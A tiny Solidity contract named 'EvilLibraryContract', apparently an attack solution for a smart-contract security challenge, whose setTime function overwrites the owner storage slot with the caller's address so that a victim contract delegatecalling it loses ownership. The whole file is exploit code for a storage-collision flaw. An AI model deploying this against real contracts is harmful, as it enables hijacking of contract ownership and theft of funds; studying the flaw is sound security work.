// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EvilLibraryContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        _time;
        owner = msg.sender;
    }
}